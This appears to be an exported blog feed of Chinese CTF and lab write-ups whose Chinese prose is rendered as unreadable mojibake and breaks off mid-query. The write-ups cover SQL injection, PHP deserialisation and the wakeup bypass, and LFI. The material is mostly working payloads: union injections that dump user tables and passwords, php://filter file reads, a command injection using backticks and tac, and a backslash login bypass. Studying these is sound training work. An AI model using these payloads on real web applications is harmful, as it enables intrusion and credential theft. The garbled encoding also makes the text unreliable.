default_character_set_name æ•°æ®åº“ç¼–ç  default_collation_name æ•°æ®åº“æ’åºè§„åˆ™ 1: (11) å¾—åˆ°8ä¸ªæ•°æ®åº“ï¼Œåˆ†åˆ«ä¸ºï¼šinformation_schema,challenges,dvwa,easysql,mysql,performance_schema,security,testï¼› åˆ©ç”¨æ˜¾ç¤ºä½çˆ†ç ´è¡¨åï¼Œæ­¤å¤„æˆ‘ä»¬æŸ¥securityæ•°æ®åº“ä¸­çš„è¡¨å æ–¹æ³•1(é€ä¸ªåˆ—å‡ºè¡¨å) ?id=-1â€™ union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 â€“+ information_schema.tableså­˜å‚¨äº†æ•°æ®è¡¨çš„è¯¦ç»†å…ƒæ•°æ®ä¿¡æ¯å¸¸ç”¨å­—æ®µ å­—æ®µ è¡¨ç¤º table_schema æ•°æ®åº“å table_name æ•°æ®è¡¨å engine å­˜å‚¨å¼•æ“ data_length è¡¨çš„å¤§å°ï¼ˆå•ä½å­—èŠ‚ï¼‰ table_rows è¡¨çš„è¡Œæ•° row_format æŸ¥çœ‹æ•°æ®è¡¨æ˜¯å¦å‹ç¼©è¿‡ index_length è¡¨çš„ç´¢å¼•çš„å¤§å°ï¼ˆå­—èŠ‚ï¼‰ æ³¨æ„ï¼šæŸ¥è¯¢information_schemaä¸­çš„ä¿¡æ¯æ—¶ï¼Œä½¿ç”¨whereè¯­å¥ï¼Œé‚£ä¸ªå€¼ä¸èƒ½ç›´æ¥ç”¨å­—æ¯ï¼Œè¦ç”¨å•å¼•å·åŒ…è£¹æˆ–è€…ç”¨å…¶åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œæ•°å€¼ç±»å‹çš„å°±ä¸ç”¨å•å¼•å·äº†ã€‚ 1securityçš„åå…­è¿›åˆ¶è½¬æ¢æ˜¯ï¼š0x7365637572697479 å¯çœ‹åˆ°ï¼Œè¯¥é¡µé¢åªå›æ˜¾äº†ä¸€ä¸ªè¡¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨limitæ¥ä¾æ¬¡åˆ—ä¸¾ï¼š ?id=-1â€™ union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0ï¼Œ1â€“+ [17]:(17) æ–¹æ³•2æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ group_concatå‡½æ•°ï¼Œå°†group byäº§ç”Ÿçš„åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœã€‚ ?id=-1â€™union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=â€™securityâ€™),3â€“+ å¾—åˆ°3ä¸ªè¡¨ï¼Œåˆ†åˆ«ä¸ºï¼šemails,referers,uagents,usersï¼› åˆ©ç”¨æ˜¾ç¤ºä½çˆ†ç ´åˆ—åï¼Œæ­¤å¤„æˆ‘ä»¬æŸ¥è¯¢usersè¡¨é‡Œçš„åˆ— ?id=-1â€™union select 1,(select group_concat(column_name) from information_schema.columns where table_name=â€™usersâ€™),3â€“+ å¾—åˆ°13ä¸ªåˆ—ï¼Œåˆ†åˆ«ä¸ºï¼šuser_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,username,passwordï¼› åˆ©ç”¨æ˜¾ç¤ºä½çˆ†ç ´å­—æ®µï¼Œæ­¤å¤„æˆ‘ä»¬æŸ¥è¯¢usersè¡¨ä¸­usernameå’Œpassword ?id=-1â€™union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users)â€“+ æŸ¥è¯¢å…¶ä»–æ•°æ®åº“å†…å®¹åŸºæœ¬åŒä¸Šï¼Œæ­¤å¤„ä¸å†èµ˜è¿°ã€‚ æŸ¥çœ‹æºç ï¼š å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æ‰€çŒœæµ‹çš„æŸ¥è¯¢è¯­å¥æ­£ç¡®; 12345678910111213141516171819202122232425262728293031323334353637&lt;?php//including the Mysql connect parameters.include(\"../sql-connections/sql-connect.php\");error_reporting(0);// take the variables if(isset($_GET['id']))&#123;$id=$_GET['id'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id.\"\\n\");fclose($fp);// connectivity $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt;","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"Magic Methodsï¼ˆé­”æœ¯å‡½æ•°ï¼‰","slug":"Magicå‡½æ•°","date":"2020-02-13T07:26:35.000Z","updated":"2020-02-13T07:57:13.177Z","comments":true,"path":"2020/02/13/Magicå‡½æ•°/","link":"","permalink":"https://singlemindedt.github.io/2020/02/13/Magicå‡½æ•°/","excerpt":"","text":"_construct()ï¼šæ„é€ å‡½æ•°ï¼Œå®åˆ—åˆ›å»ºæ—¶è¢«è°ƒç”¨ï¼› _destruction()ï¼šææ„å‡½æ•°ï¼Œåœ¨å®ä¾‹è¢«é”€æ¯æ—¶è¢«è°ƒç”¨ï¼› _toString()ï¼šå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²å¯¹å¾…æ—¶ä½¿ç”¨ï¼› _sleep()ï¼šåºåˆ—åŒ–å¯¹è±¡ä¹‹å‰è°ƒç”¨ _wakeup()ï¼šååºåˆ—åŒ–ä¹‹å‰è°ƒç”¨ _call()ï¼šè°ƒç”¨å¯¹è±¡ä¸å­˜åœ¨æ—¶ä½¿ç”¨ï¼›ï¼ˆä¸ºäº†é¿å…å½“è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æ—¶äº§ç”Ÿé”™è¯¯ï¼Œè€Œæ„å¤–çš„å¯¼è‡´ç¨‹åºä¸­æ­¢ï¼Œå¯ä»¥ä½¿ç”¨ _call() æ–¹æ³•æ¥é¿å…ã€‚è¯¥æ–¹æ³•åœ¨è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œç¨‹åºä»ä¼šç»§ç»­æ‰§è¡Œä¸‹å»ã€‚ï¼‰_get()ï¼šé€šè¿‡å®ƒå¯ä»¥åœ¨å¯¹è±¡çš„å¤–éƒ¨è·å–ç§æœ‰æˆå‘˜å±æ€§çš„å€¼ï¼›ç›¸å…³æ–‡çŒ®","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://singlemindedt.github.io/tags/PHP/"}]},{"title":"unserialize3","slug":"unserialize3","date":"2020-02-13T07:26:35.000Z","updated":"2020-02-25T14:29:30.815Z","comments":true,"path":"2020/02/13/unserialize3/","link":"","permalink":"https://singlemindedt.github.io/2020/02/13/unserialize3/","excerpt":"","text":"æ ¹æ®é¢˜ç›®åŠä¸‹é¢çš„ä»£ç ï¼šå®šä¹‰äº†ç±»xctfï¼Œå…¶ä¸­æœ‰flagå˜é‡ï¼Œå¹¶è°ƒç”¨äº†_wakeup()ï¼Œåˆ™è€ƒè™‘å®ä¾‹åŒ–xctfç±»å¹¶å°†å…¶å˜é‡åºåˆ—åŒ–ã€‚æ ¹æ®ï¼Ÿcode= çŒœæµ‹å¯èƒ½ä¸ºå°†åºåˆ—åŒ–ç»“æœè¾“å…¥åœ¨?code=åPOSTè¯·æ±‚ï¼› 12345678910&lt;?phpclass xctf&#123; public $flag = '111';public function __wakeup()&#123;exit('bad requests');&#125;&#125;$a=new xctf();print(serialize($a));?&gt; è¿è¡Œç»“æœ: 1O:4:\"xctf\":1:&#123;s:4:\"flag\";s:3:\"111\";&#125; å°†æ­¤ç»“æ„é”®å…¥ï¼Œä¼šå¾—åˆ°â€œbad requestsâ€ï¼Œå¹¶æ¨å‡ºè„šæœ¬,å³æ‰§è¡Œäº†_wakeup()ã€‚å› æ­¤åº”æƒ³åŠæ³•ç»•è¿‡_wakeup();wakeup()æ‰§è¡Œæ¼æ´ï¼šä¸€ä¸ªå­—ç¬¦ä¸²æˆ–å¯¹è±¡è¢«åºåˆ—åŒ–åï¼Œå¦‚æœå…¶å±æ€§è¢«ä¿®æ”¹ï¼Œå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œwakeup()å‡½æ•°payload: 1http://111.198.29.45:30964/?code=O:4:%22xctf%22:3:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;å³åªéœ€è¦å°†å±æ€§æ”¹ä¸ºå¤§äºç°å±æ€§æ•°å³å¯ï¼› å¾—åˆ°ç»“æœï¼š 1the answer is : cyberpeace&#123;4ca0babcfe2c461d7b7dafca84b009bb&#125; å…³äºPHPåºåˆ—åŒ–","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://singlemindedt.github.io/tags/PHP/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"https://singlemindedt.github.io/tags/æ”»é˜²ä¸–ç•Œ/"}]},{"title":"PHPåºåˆ—åŒ–ä¸ååºåˆ—åŒ–","slug":"PHPåºåˆ—åŒ–ä¸å‘åºåˆ—åŒ–","date":"2020-02-13T07:26:35.000Z","updated":"2020-02-21T09:54:34.954Z","comments":true,"path":"2020/02/13/PHPåºåˆ—åŒ–ä¸å‘åºåˆ—åŒ–/","link":"","permalink":"https://singlemindedt.github.io/2020/02/13/PHPåºåˆ—åŒ–ä¸å‘åºåˆ—åŒ–/","excerpt":"","text":"åºåˆ—åŒ–serializeï¼ˆï¼‰æ˜¯å°†ç¨‹åºä¸­å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯è½¬æ¢ä¸ºå¯å­˜å‚¨å½¢å¼çš„è¿‡ç¨‹ï¼ˆä¸€èˆ¬ä¸ºå­—ç¬¦ä¸²ï¼‰ä¾‹1(æ•°ç»„å˜é‡)ï¼š 12345&lt;?php$arr = array('name', 'age', 'gender');$serialized_data = serialize($arr);echo $serialized_data;?&gt; è¿è¡Œç»“æœï¼š 1a:3:&#123;i:0;s:4:\"name\";i:1;s:3:\"age\";i:2;s:6:\"gender\";&#125; å…¶ä¸­å„å­—ç¬¦å«ä¹‰ï¼ša:è¡¨ç¤ºæ•°æ®ç±»å‹ï¼Œæ­¤å¤„ä¸ºarrayï¼›a:3ä¸­çš„3è¡¨ç¤ºæ•°ç»„å…ƒç´ çš„ä¸ªæ•°ï¼ˆname,age,genderï¼‰ï¼›i:è¡¨ç¤ºæ•´å‹int;i:0ä¸­çš„0ï¼šè¡¨ç¤ºæ•°ç»„å…ƒç´ çš„ä¸‹æ ‡ï¼ˆåºï¼‰ï¼›s:è¡¨ç¤ºstringï¼ˆæ•°ç»„å€¼çš„ç±»å‹)ï¼›s:4ä¸­çš„4ï¼šè¡¨ç¤ºæ•°ç»„å€¼çš„é•¿åº¦ï¼› 123456ä¸åŒæ•°æ®ç±»å‹ï¼š&lt;?php$arr = array('name', 'age', 66,233);$serialized_data = serialize($arr);echo $serialized_data;?&gt; è¿è¡Œç»“æœï¼š 1a:4:&#123;i:0;s:4:\"name\";i:1;s:3:\"age\";i:2;i:66;i:3;i:233;&#125; ä¾‹2ï¼ˆå¯¹è±¡ï¼‰ 123456789101112131415&lt;?phpclass man&#123; public $name; public $age; public $gender; function __construct($name,$age,$gender)&#123; //_constructï¼šåˆ›å»ºå¯¹è±¡æ—¶åˆå§‹åŒ– $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;gender = $gender; &#125;&#125;$man=new man('Alice',20,'female');var_dump(serialize($man));?&gt; è¿è¡Œç»“æœï¼š 1string(78) \"O:3:\"man\":3:&#123;s:4:\"name\";s:5:\"Alice\";s:3:\"age\";i:20;s:6:\"gender\";s:6:\"female\";&#125;\" ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œç»™å‡ºäº†ç›¸å…³æ ¼å¼å­—ç¬¦çš„å«ä¹‰ï¼š 1234567891011121314- testç±»ä¸­å®šä¹‰äº†ä¸‰ä¸ªå±æ€§ï¼ˆprivateï¼š$flagã€protected:$testã€public:$test1ï¼‰ä¸¤ä¸ªæ–¹æ³•(set_flag()ç»™ç§æœ‰å±æ€§flagèµ‹å€¼ã€get_flag()è·å–ç§æœ‰å±æ€§flag);- $object=new test(); //åˆ›å»ºå¯¹è±¡- $object-&gt;set_flag('Active'); //åˆ›å»ºçš„å¯¹è±¡è°ƒç”¨set_flag()æ–¹æ³•ï¼Œå¯¹flagèµ‹å€¼- $data=serialize($object); //å¯¹è¯¥å¯¹è±¡åºåˆ—åŒ–- åºåˆ—åŒ–æ—¶åªåºåˆ—åŒ–å±æ€§,ä¸åºåˆ—åŒ–æ–¹æ³•ï¼› - testflag(å±æ€§åï¼Œç§æœ‰å±æ€§åªå±äºtestç±»ï¼Œæ‰€ä»¥åœ¨å‰é¢åŠ ä¸Šäº†testç±»åï¼Œåè·Ÿå±æ€§åflagï¼› - phpé‡Œé»˜è®¤åœ¨testflagé¦–å°¾åˆ†åˆ«åŠ äº†\\0ï¼Œå³\\0testflag\\0ï¼Œæ‰€ä»¥é•¿åº¦ä¸º10ï¼›)- $flagçš„å€¼æœ¬æ¥æ˜¯â€œInactiveâ€ï¼Œé€šè¿‡$obiect-&gt;set_flag('Active')æ”¹ä¸ºäº†'Active'æ‰€ä»¥å±æ€§å€¼ä¸º6ä¸ªå­—ç¬¦é•¿åº¦ï¼› - å—ä¿æŠ¤çš„å±æ€§å³protectedï¼Œåœ¨å…¶å±æ€§åå‰è¦åŠ â€˜*â€™ï¼Œå³*testï¼› ååºåˆ—åŒ–unserializeï¼ˆï¼‰æ˜¯å°†åºåˆ—åŒ–çš„æ•°æ®åå‘é‡æ–°æ„å»ºä¸ºphpä¸­åŸæ•°æ®ç±»å‹å’Œç»“æ„ã€‚æ•°ç»„å˜é‡ 12345678&lt;?php$arr = array('name', 'age', 66,233);$serialized_data = serialize($arr);#echo $serialized_data;$unserialized_data = unserialize($serialized_data);#print_r($unserialized_data);#print_r() å‡½æ•°ç”¨äºæ‰“å°å˜é‡ï¼Œä»¥æ›´å®¹æ˜“ç†è§£çš„å½¢å¼å±•ç¤ºã€‚ var_dump($unserialized_data);#var_dump() å‡½æ•°æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚æ•°ç»„å°†é€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„ã€‚?&gt; è¿è¡Œç»“æœï¼š 12345678910array(4) &#123; [0]=&gt; string(4) \"name\" [1]=&gt; string(3) \"age\" [2]=&gt; int(66) [3]=&gt; int(233)&#125; å¯¹è±¡ 1234567891011121314151617&lt;?phpclass man&#123; public $name; public $age; public $gender; function __construct($name,$age,$gender)&#123; //_constructï¼šåˆ›å»ºå¯¹è±¡æ—¶åˆå§‹åŒ– $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;gender = $gender; &#125;&#125;#$man=new man('Alice',20,'female');#var_dump(serialize($man));$man='O:3:\"man\":3:&#123;s:4:\"name\";s:5:\"Alice\";s:3:\"age\";i:20;s:6:\"gender\";s:6:\"female\";&#125;';var_dump(unserialize($man));?&gt; è¿è¡Œç»“æœï¼š 12345678object(man)#1 (3) &#123; [\"name\"]=&gt; string(5) \"Alice\" [\"age\"]=&gt; int(20) [\"gender\"]=&gt; string(6) \"female\"&#125; ååºåˆ—åŒ–æ¼æ´éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š PHPä¸­æœ‰å¯ä»¥åˆ©ç”¨çš„ç±»å¹¶ä¸”ç±»ä¸­æœ‰å¯åˆ©ç”¨çš„magicå‡½æ•°ä»¥â€™__â€™å¼€å¤´ unserialize()å‡½æ•°çš„å‚æ•°å¯æ§ï¼ˆåˆ™å¯ä»¥ä¼ å…¥æ„é€ çš„å­—ç¬¦ä¸²å®ç°æ”»å‡»ï¼‰ å…³äºmagic Methodsï¼ˆé­”æœ¯å‡½æ•°ï¼‰ ç›¸å…³é¢˜ç›®unserialize3","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://singlemindedt.github.io/tags/PHP/"}]},{"title":"æ–°å¹´æ‰“å¡","slug":"2020-1-1-diary","date":"2020-01-01T00:00:00.000Z","updated":"2020-01-01T00:21:46.862Z","comments":true,"path":"2020/01/01/2020-1-1-diary/","link":"","permalink":"https://singlemindedt.github.io/2020/01/01/2020-1-1-diary/","excerpt":"","text":"å¤§æ¸…æ—©å„ç§åˆ·ï¼Œç„¶åè‡ªå·±ä¹Ÿæƒ³çºªå¿µä¸€ä¸‹ä¸‹ğŸ˜‚ä¸çŸ¥ä¸è§‰ä¸€å¹´åˆè¿‡å»äº†ï¼Œå›é¡¾è¿™ä¸€å¹´ï¼Œä¼¼ä¹æŒºæµª233ï¼Œâ€¦â€¦e,å›æ¥å†è¡¥ï¼å…ˆå¤ä¹ å…ˆå¤ä¹ ğŸƒ","categories":[{"name":"summary","slug":"summary","permalink":"https://singlemindedt.github.io/categories/summary/"}],"tags":[{"name":"Diary","slug":"Diary","permalink":"https://singlemindedt.github.io/tags/Diary/"}]},{"title":"cryptography","slug":"cryptography","date":"2019-12-31T01:22:54.000Z","updated":"2020-01-01T05:15:46.014Z","comments":true,"path":"2019/12/31/cryptography/","link":"","permalink":"https://singlemindedt.github.io/2019/12/31/cryptography/","excerpt":"","text":"ç§‘å…‹éœå¤«åŸåˆ™ï¼šå¯†ç ç³»ç»Ÿçš„å®‰å…¨æ€§ä¸åº”è¯¥å–å†³äºä¸æ˜“æ”¹å˜çš„ç®—æ³•ï¼Œè€Œåº”å–å†³äºå¯éšæ—¶æ”¹å˜çš„å¯†é’¥. å¯†ç ä½“åˆ¶çš„åˆ†ç±»ï¼š Â§å¯¹ç§°**å¯†ç ä½“åˆ¶**â€¢åºåˆ—å¯†ç (æµå¯†ç )â€¢åˆ†ç»„å¯†ç Â§å…¬é’¥å¯†**ç ä½“åˆ¶/éå¯¹ç§°å¯†ç ä½“åˆ¶**","categories":[{"name":"summary","slug":"summary","permalink":"https://singlemindedt.github.io/categories/summary/"}],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"hackme","slug":"hackme","date":"2019-12-28T16:00:00.000Z","updated":"2019-12-30T09:26:10.149Z","comments":true,"path":"2019/12/29/hackme/","link":"","permalink":"https://singlemindedt.github.io/2019/12/29/hackme/","excerpt":"","text":"[TOC] hackme MiscFlagç›´æ¥æäº¤æè¿°å³å¯ï¼› Corgi can flyå®é™…æ“ä½œï¼šæç¤ºä½¿ç”¨stegsolve,å¾—åˆ°äºŒç»´ç ï¼Œæ‰«æå¾—åˆ°flag Televisionå®é™…æ“ä½œï¼šå°†å›¾ç‰‡æ‹–å…¥winhex,æœç´¢å…³é”®å­—flag Meowå®é™…æ“ä½œï¼šåˆ©ç”¨foremost meow.pngæå–ï¼Œå¾—åˆ°ä¸€ä¸ªpngå’Œä¸€ä¸ªzip æ‰“å¼€zipé‡Œé¢æœ‰åŠ å¯†çš„flagè¿˜æœ‰ä¸€å¼ png, ä»”ç»†è§‚å¯Ÿå¯ä»¥å‘ç°ä¸¤ä¸ªå‹ç¼©åŒ…å†…pngçš„crc32 å€¼ä¸€æ ·. æ•…ç”¨æ˜æ–‡æ”»å‡»ï¼Œå¯ä»¥ä½¿ç”¨Advanced Zip Password Recoveryæ¥è¿›è¡Œç ´è§£ï¼›è¿™é‡Œæˆ‘ä»¬ç”¨pkcrack: åŸç†ï¼šZIPæ˜æ–‡æ”»å‡»å°±æ˜¯åˆ©ç”¨å·²çŸ¥æ–‡ä»¶æ‰¾åŠ å¯†å¯†é’¥ï¼Œåˆ©ç”¨å¯†é’¥æ¥è§£é”å…¶å®ƒåŠ å¯†æ–‡ä»¶ï¼Œå› ä¸ºZIPå‹ç¼©åŒ…é‡Œçš„æ‰€æœ‰æ–‡ä»¶éƒ½æ˜¯ä½¿ç”¨åŒä¸€ä¸ªåŠ å¯†å¯†é’¥æ¥åŠ å¯†çš„ã€‚ æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š Where is flagé—®é¢˜åˆ†æï¼šç»™å‡ºä¸€ä¸²å­—ç¬¦ï¼š Flagåº”è¯¥å°±åœ¨è¿™é‡Œé¢ï¼Œæç¤ºæ­£åˆ™ï¼šcat flag |grep -oP â€œFLAG{[0-9a-zA-Z]+}â€ å¾—åˆ°flagã€‚ Encoderé—®é¢˜æè¿°ï¼šCan you decode this?ä¸‹è½½è§£å‹å¾—åˆ° encoder.py å’Œ flag.encï¼› 12345678910111213141516171819202122232425262728import randomimport stringdef rot13(s): return s.translate(string.maketrans(string.uppercase + string.lowercase, string.uppercase[13:] + string.uppercase[:13] + string.lowercase[13:] + string.lowercase[:13]))def base64(s): return ''.join(s.encode('base64').split())def hex(s): return s.encode('hex')def upsidedown(s): return s.translate(string.maketrans(string.uppercase + string.lowercase, string.lowercase + string.uppercase))flag = 'FLAG&#123;.....................&#125;' # try to recover flagE = (rot13, base64, hex, upsidedown)for i in range(random.randint(30, 50)): print i c = random.randint(0, len(E) - 1) flag = '%d%s' % (c, E[c](flag))open('flag.enc', 'w').write(flag) å¯ä»¥æ˜æ˜¾çœ‹åˆ°cçš„å€¼å°±åœ¨å¯†æ–‡å¼€å¤´ï¼š 123456789101112131415161718192021222324252627282930from binascii import unhexlifyfrom base64 import b64decodeimport stringdef unrot13(s): return s.translate(str.maketrans(string.ascii_uppercase[13:] + string.ascii_uppercase[:13] + string.ascii_lowercase[13:] + string.ascii_lowercase[:13], string.ascii_uppercase + string.ascii_lowercase))def unupsidedown(s): return s.translate(str.maketrans(string.ascii_lowercase + string.ascii_uppercase, string.ascii_uppercase + string.ascii_lowercase))def unbase64(s): return b64decode(s).decode()def unhex(s): return unhexlify(s).decode()with open('./flag.enc') as f: data = f.read()E = (unrot13, unbase64, unhex, unupsidedown)for i in range(50): c, data = int(data[0]), data[1:] data = E[c](data) if data.startswith('FLAG'): print(data) break è¿ç®—ç»“æœå¦‚ä¸‹ï¼Œå¾—åˆ°flagï¼š Pusheen.txté—®é¢˜æè¿°ï¼š1Do you think pusheen is cute? ä¸‹è½½è§£å‹å¾—åˆ° pusheen.txt, é‡Œé¢æ˜¯ä¸€å †ä¸å¯åçŠ¶çš„å­—ç¬¦ç”»å­—ç¬¦ä¸¤ç§, æŠŠè¿™ä¸ªåºåˆ—è½¬æˆäºŒè¿›åˆ¶, å†è½¬ASCII, å°±å¾—åˆ°äº† flag (ç™½ä¸º0ï¼Œé»‘ä¸º1ï¼Œè½¬åŒ–ä¸ºascll) Web hide and seeké—®é¢˜æè¿°ï¼š1Can you see me? I'm so close to you but you can't see me. å®é™…æ“ä½œï¼šæŸ¥çœ‹æºç ï¼š æˆ–è€…ç›´æ¥æŸ¥çœ‹æ§åˆ¶å°ï¼ˆConsoleï¼‰é‡Œé¢æœ‰å¼ äºŒç»´ç ï¼Œæ‰«ä¸€ä¸‹å¾—åˆ°flagæ­¤å¤„åšä¸€æ ‡è®°orzï¼Œæ‰«äºŒç»´ç çš„ç¡®å¾—åˆ°äº†flagï¼Œä½†æ˜¯ä¸æ˜¯è¿™ä¸€é¢˜çš„hhhhhâ€¦,æäº¤å‘ç°æ˜¯homepageçš„ã€‚ Guestbooké—®é¢˜æè¿°ï¼š1This guestbook sucks. sqlmap is your friend. å®é™…æ“ä½œï¼š æç¤ºç”¨sqlmapï¼Œå°±æ˜¯sqlæ³¨å…¥äº†ï¼Œæ‰‹åŠ¨æ³¨å…¥ä¸€ä¸‹ï¼š1https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,4 1https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database() çœ‹åˆ°flagè¡¨ 1https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(flag)%20from%20flag æŸ¥è¯¢æ‰€æœ‰æ•°æ® LFIçŸ¥è¯†è¡¥å……ï¼š php://filteræ˜¯PHPè¯­è¨€ä¸­ç‰¹æœ‰çš„åè®®æµï¼Œä½œç”¨æ˜¯ä½œä¸ºä¸€ä¸ªâ€œä¸­é—´æµâ€æ¥å¤„ç†å…¶ä»–æµã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹ä¸€è¡Œä»£ç å°†POSTå†…å®¹è½¬æ¢æˆbase64ç¼–ç å¹¶è¾“å‡ºï¼šreadfile(â€œphp://filter/read=convert.base64-encode/resource=php://inputâ€); å®é™…æ“ä½œï¼šæ­¤é¢˜urlä¸ºï¼šhttps://hackme.inndy.tw/lfi/?page=pages/indexç»“åˆé¢˜ç›®æç¤ºï¼Œåº”è¯¥ä¸ºè¯»æ–‡ä»¶ï¼› 1è¯»ï¼šhttps://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag å¾—åˆ°ä¸€ä¸²base64è§£ç å¾—åˆ°ï¼šCan you read the flag?ç»§ç»­è¯»config.php 1https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config å¾—åˆ°base64è§£å¯†å¾—åˆ°flag Homepageå·²è§£å†³ï¼Œè§ç¬¬ä¸€é¢˜ï¼› Ping æºç ç»™å‡ºï¼Œç›®çš„æ˜¯å¯¹è¿™ä¸ªå‘½ä»¤æ³¨å…¥ ping -c 1 â€œ{$ip}â€ 2&gt;&amp;1é»‘åå•æœªè¿‡æ»¤åå¼•å·ï¼Œå°è¯•?ip=ls,å¾—åˆ°ï¼š Catè¢«è¿‡æ»¤ï¼Œå¯ä»¥å°è¯•ç”¨tacå€’ç€æ˜¾ç¤ºï¼Œflagä¹Ÿè¢«è¿‡æ»¤ï¼Œä½¿ç”¨é€šé…ç¬¦æ¨¡ç³ŠåŒ¹é…ä¸€ä¸‹ï¼š 1?ip='tac f*' å¾—åˆ°flagã€‚ scoreboardæ²¡å•¥æ€è·¯ï¼Œå®¡æŸ¥å…ƒç´ æŸ¥æ‰¾å…³é”®å­—flagï¼Œåœ¨å“åº”å¤´é‡Œå‘ç°flag login as admin 0 Sqlæ³¨å…¥ï¼Œæç¤ºåˆ©ç”¨guestç™»é™†ï¼ˆguestï¼Œä¸­æ–‡æ„æ€æ˜¯å®¢äººï¼Œç½‘ç»œæ˜¯æŒ‡è®¡ç®—æœºçš„æ¥å®¾è´¦æˆ·ã€‚ä¸â€œAdministratorâ€å’Œâ€œUserâ€ä¸åŒçš„ï¼Œé€šå¸¸è¿™ä¸ªå¸æˆ·æ²¡æœ‰ä¿®æ”¹ç³»ç»Ÿè®¾ç½®å’Œè¿›è¡Œå®‰è£…ç¨‹åºçš„æƒé™ï¼Œä¹Ÿæ²¡æœ‰åˆ›å»ºä¿®æ”¹ä»»ä½•æ–‡æ¡£çš„æƒé™ï¼Œåªèƒ½æ˜¯è¯»å–è®¡ç®—æœºç³»ç»Ÿä¿¡æ¯å’Œæ–‡ä»¶ã€‚æ¥å®¾å¸æˆ·å¯æä¾›è‹¥å¹²ä¸å®‰å…¨æ€§å’Œç½‘ç»œå…±äº«ç›¸å…³çš„ç‰¹æ®ŠåŠŸèƒ½ã€‚ï¼‰ å®é™…æ“ä½œï¼š æŸ¥çœ‹ç½‘é¡µæºç ï¼Œå¯ä»¥çœ‹åˆ°ç›´æ¥è¿”å›äº†debugä¿¡æ¯ï¼Œå«æœ‰å®Œæ•´çš„SQLè¯­å¥ï¼š æŸ¥çœ‹ç»™å‡ºçš„æºç ï¼Œå‘ç°è¿‡æ»¤äº†â€™ï¼Œå°†â€™è½¬ä¸º/â€™ï¼Œè¿™é‡Œæˆ‘ä»¬å†æ·»åŠ ä¸€ä¸ªè½¬ä¹‰ç¬¦ï¼ŒæŠŠå®ƒæ·»åŠ çš„è½¬ä¹‰ç¬¦è½¬ä¹‰äº†ã€‚ æ„é€ payloadï¼š1user=admin\\â€™||1=1#;password=0 æç¤ºèº«ä»½ä¸ºguestï¼Œå³ç¬¬ä¸€ä¸ªç”¨æˆ·ä¸æ˜¯adminï¼› 1æ„é€ ï¼šuser=admin\\â€™||1=1 limit 1,1#ï¼›å¾—åˆ°flag login as admin 0.1é¢˜ç›®åˆ†æï¼šæ­¤é¢˜å’Œä¸Šé¢˜ç”¨çš„æ˜¯åŒä¸€ä¸ªæ•°æ®åº“ï¼Œè¿™æ¬¡è¦åœ¨åº“é‡Œæ‰¾flag2ï¼› å®é™…æ“ä½œï¼š ç¡®å®šåˆ—ï¼š1user=admin\\' union select 1,2,3,4#&amp;password=0 æ­£å¸¸å›æ˜¾äº†2ï¼Œå›ºæœ‰å››åˆ—ï¼› è¡¨å1User=admin \\' union select 1,concat(table_name),3,4 from information_schema.tables where table_schema=database() å¾—åˆ°è¡¨åï¼šh1dden_f14g 1User=admin \\' union select 1,concat(column_name),3,4 from information_schema.columns where table_schema=database() and 